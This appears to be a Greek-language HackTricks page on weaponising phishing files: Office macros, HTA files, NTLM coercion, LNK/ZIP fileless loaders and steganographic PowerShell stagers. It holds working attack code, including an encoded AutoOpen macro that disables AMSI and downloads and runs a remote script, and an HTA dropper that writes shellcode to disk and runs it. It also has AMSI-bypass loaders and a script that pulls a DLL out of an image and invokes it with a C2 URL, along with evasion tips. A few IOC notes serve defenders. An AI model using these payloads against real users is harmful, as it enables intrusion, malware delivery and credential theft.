# Phishing Αρχεία & Έγγραφα

{{#include ../../banners/hacktricks-training.md}}

## Έγγραφα Office

Το Microsoft Word εκτελεί επικύρωση δεδομένων αρχείου πριν ανοίξει ένα αρχείο. Η επικύρωση δεδομένων πραγματοποιείται με τη μορφή αναγνώρισης της δομής δεδομένων, σύμφωνα με το πρότυπο OfficeOpenXML. Εάν προκύψει οποιοδήποτε σφάλμα κατά την αναγνώριση της δομής δεδομένων, το αρχείο που αναλύεται δεν θα ανοιχτεί.

Συνήθως, αρχεία Word που περιέχουν macros χρησιμοποιούν την επέκταση `.docm`. Ωστόσο, είναι δυνατό να μετονομαστεί το αρχείο αλλάζοντας την κατάληξη και να διατηρηθούν οι δυνατότητες εκτέλεσης των macros.\
Για παράδειγμα, ένα αρχείο RTF δεν υποστηρίζει macros εκ του σχεδιασμού, αλλά ένα αρχείο DOCM μετονομασμένο σε RTF θα χειριστείται από το Microsoft Word και θα είναι ικανό να εκτελέσει macros.\
Οι ίδιες εσωτερικές λειτουργίες και μηχανισμοί εφαρμόζονται σε όλα τα προγράμματα του Microsoft Office Suite (Excel, PowerPoint etc.).

Μπορείτε να χρησιμοποιήσετε την ακόλουθη εντολή για να ελέγξετε ποιες επεκτάσεις θα εκτελούνται από ορισμένα προγράμματα Office:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX αρχεία που αναφέρονται σε ένα απομακρυσμένο template (File –Options –Add-ins –Manage: Templates –Go) που περιλαμβάνει macros μπορούν να “εκτελέσουν” macros επίσης.

### Εξωτερική Φόρτωση Εικόνας

Μεταβείτε στο: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, και **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Είναι δυνατό να χρησιμοποιηθούν macros για την εκτέλεση arbitrary code από το έγγραφο.

#### Autoload functions

Όσο πιο συνηθισμένες είναι, τόσο πιο πιθανό το AV να τις εντοπίσει.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Αφαίρεση μεταδεδομένων χειροκίνητα

Μεταβείτε στο **File > Info > Inspect Document > Inspect Document**, το οποίο θα εμφανίσει το Document Inspector. Κάντε κλικ στο **Inspect** και έπειτα στο **Remove All** δίπλα από τα **Document Properties and Personal Information**.

#### Doc Extension

Όταν τελειώσετε, επιλέξτε το αναδυόμενο μενού **Save as type**, αλλάξτε τη μορφή από **`.docx`** σε **Word 97-2003 `.doc`**.\
Κάντε το επειδή **you can't save macro's inside a `.docx`** και υπάρχει ένα **stigma** **around** την macro-enabled **`.docm`** επέκταση (π.χ. το εικονίδιο μικρογραφίας έχει μεγάλο `!` και ορισμένα web/email gateway τα μπλοκάρουν εντελώς). Επομένως, αυτή η **legacy `.doc` extension είναι ο καλύτερος συμβιβασμός**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Αρχεία HTA

Ένα HTA είναι ένα Windows πρόγραμμα που **συνδυάζει HTML και scripting languages (όπως VBScript και JScript)**. Δημιουργεί το user interface και εκτελείται ως "fully trusted" εφαρμογή, χωρίς τους περιορισμούς του security model ενός browser.

Ένα HTA εκτελείται χρησιμοποιώντας **`mshta.exe`**, το οποίο συνήθως **installed** μαζί με τον **Internet Explorer**, καθιστώντας **`mshta` dependant on IE**. Έτσι, αν αυτό έχει απεγκατασταθεί, τα HTA δεν θα μπορούν να εκτελεστούν.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Εξαναγκασμός NTLM Authentication

Υπάρχουν αρκετοί τρόποι να **αναγκάσετε την NTLM authentication "απομακρυσμένα"**, για παράδειγμα, μπορείτε να προσθέσετε **αόρατες εικόνες** σε emails ή HTML που ο χρήστης θα ανοίξει (έστω και HTTP MitM?). Ή να στείλετε στο θύμα την **διεύθυνση αρχείων** που θα **προκαλέσουν** μια **authentication** μόνο για το **άνοιγμα του φακέλου.**

**Ελέγξτε αυτές τις ιδέες και περισσότερα στις παρακάτω σελίδες:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Μην ξεχνάτε ότι δεν μπορείτε μόνο να κλέψετε το hash ή την authentication αλλά και να **εκτελέσετε NTLM relay attacks**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Πολύ αποδοτικές εκστρατείες παραδίδουν ένα ZIP που περιέχει δύο νόμιμα έγγραφα δόλωμα (PDF/DOCX) και ένα κακόβουλο .lnk. Το κόλπο είναι ότι ο πραγματικός PowerShell loader αποθηκεύεται μέσα στα raw bytes του ZIP μετά από έναν μοναδικό marker, και το .lnk τον εξάγει και τον τρέχει πλήρως στη μνήμη.

Τυπική ροή που υλοποιείται από το .lnk PowerShell one-liner:

1) Εντοπίστε το αρχικό ZIP σε συνηθισμένες διαδρομές: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, και ο parent του τρέχοντος working directory.
2) Διαβάστε τα bytes του ZIP και βρείτε έναν hardcoded marker (π.χ., xFIQCV). Ό,τι βρίσκεται μετά το marker είναι το embedded PowerShell payload.
3) Αντιγράψτε το ZIP σε %ProgramData%, αποσυμπιέστε το εκεί και ανοίξτε το έγγραφο δόλωμα .docx για να φαίνεται νόμιμο.
4) Παρακάμψτε την AMSI για την τρέχουσα διεργασία: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfuscate το επόμενο στάδιο (π.χ., αφαιρέστε όλους τους χαρακτήρες #) και εκτελέστε το στη μνήμη.

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Σημειώσεις
- Η παράδοση συχνά καταχράται αξιόπιστα PaaS subdomains (π.χ., *.herokuapp.com) και μπορεί να περιορίζει τα payloads (σερβίροντας αβλαβή ZIPs ανάλογα με IP/UA).
- Το επόμενο στάδιο συχνά αποκρυπτογραφεί base64/XOR shellcode και το εκτελεί μέσω Reflection.Emit + VirtualAlloc για να ελαχιστοποιήσει τα artifacts στο δίσκο.

Persistence used in the same chain
- COM TypeLib hijacking του Microsoft Web Browser control ώστε το IE/Explorer ή οποιαδήποτε εφαρμογή που το ενσωματώνει να επανεκκινεί το payload αυτόματα. Δείτε λεπτομέρειες και έτοιμες εντολές προς χρήση εδώ:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Κυνήγι/IOCs
- ZIP αρχεία που περιέχουν την ASCII marker string (π.χ., xFIQCV) προσαρτημένη στα δεδομένα του αρχείου.
- .lnk που απαριθμεί parent/user φακέλους για να εντοπίσει το ZIP και ανοίγει ένα decoy document.
- Παρέμβαση σε AMSI μέσω [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Μακροχρόνια business threads που καταλήγουν σε links φιλοξενούμενα σε trusted PaaS domains.

## Steganography-delimited payloads in images (PowerShell stager)

Πρόσφατες αλυσίδες loader παραδίδουν έναν obfuscated JavaScript/VBS που αποκωδικοποιεί και εκτελεί έναν Base64 PowerShell stager. Αυτός ο stager κατεβάζει μια εικόνα (συχνά GIF) που περιέχει ένα Base64-encoded .NET DLL κρυμμένο ως απλό κείμενο μεταξύ μοναδικών start/end markers. Το script ψάχνει γι' αυτούς τους delimiters (παραδείγματα που έχουν παρατηρηθεί: «<<sudo_png>> … <<sudo_odt>>>»), εξάγει το κείμενο μεταξύ τους, το Base64-decodes σε bytes, φορτώνει το assembly στη μνήμη και καλεί μια γνωστή entry method με το C2 URL.

Workflow
- Stage 1: Archived JS/VBS dropper → αποκωδικοποιεί embedded Base64 → ξεκινάει το PowerShell stager με -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → κατεβάζει την εικόνα, carve-άρει το marker-delimited Base64, φορτώνει το .NET DLL στη μνήμη και καλεί την method του (π.χ., VAI) περνώντας το C2 URL και options.
- Stage 3: Ο loader παραλαμβάνει το τελικό payload και συνήθως το inject-άρει μέσω process hollowing σε ένα trusted binary (συνήθως MSBuild.exe). Δείτε περισσότερα για process hollowing και trusted utility proxy execution εδώ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Σημειώσεις
- This is ATT&CK T1027.003 (steganography/marker-hiding). Markers vary between campaigns.
- AMSI/ETW bypass και string deobfuscation εφαρμόζονται συνήθως πριν το φόρτωμα του assembly.
- Hunting: σκανάρετε τα κατεβασμένα εικόνες για γνωστούς delimiters· εντοπίστε PowerShell που προσπελαύνει εικόνες και αμέσως αποκωδικοποιεί Base64 blobs.

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ένα επαναλαμβανόμενο αρχικό στάδιο είναι ένα μικρό, βαριά συσκοτισμένο `.js` ή `.vbs` που παραδίδεται μέσα σε ένα archive. Ο μοναδικός του σκοπός είναι να αποκωδικοποιήσει μια ενσωματωμένη Base64 συμβολοσειρά και να εκκινήσει PowerShell με `-nop -w hidden -ep bypass` για να προετοιμάσει το επόμενο στάδιο μέσω HTTPS.

Σκελετική λογική (αφηρημένα):
- Διαβάζει τα περιεχόμενα του ίδιου αρχείου
- Εντοπίζει ένα Base64 blob ανάμεσα σε junk strings
- Αποκωδικοποιεί σε ASCII PowerShell
- Εκτελεί με `wscript.exe`/`cscript.exe` που καλούν `powershell.exe`

Ένδειξεις ανίχνευσης
- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String` in the command line.
- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.

## Windows files to steal NTLM hashes

Δείτε τη σελίδα σχετικά με **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## Αναφορές

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
